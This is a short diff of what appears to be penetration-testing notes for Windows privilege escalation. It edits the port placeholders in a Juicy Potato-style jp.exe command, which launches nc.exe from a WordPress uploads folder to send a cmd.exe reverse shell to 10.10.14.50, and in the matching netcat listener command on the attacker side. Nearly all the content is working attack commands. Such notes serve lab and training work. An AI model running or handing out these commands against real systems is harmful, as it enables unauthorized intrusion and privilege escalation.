@@ -159,7 +159,7 @@ Optional args:
 
 *victim*
 
-> jp.exe -l 8000 -p %comspec% -a "/c C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -nv 10.10.14.50 8002 -e cmd.exe" -t * -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}"
+> jp.exe -l *portA(prefer 1337)* -p %comspec% -a "/c C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -nv 10.10.14.50 *portB* -e cmd.exe" -t * -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}"
 
 ```
 Testing {C49E32C6-BC8B-11d2-85D4-00105A1F8304} 8000
@@ -172,7 +172,7 @@ Testing {C49E32C6-BC8B-11d2-85D4-00105A1F8304} 8000
 
 *attacker*
 
-> nc -lvnp *port2*
+> nc -lvnp *portB*
 
 > whoami
 
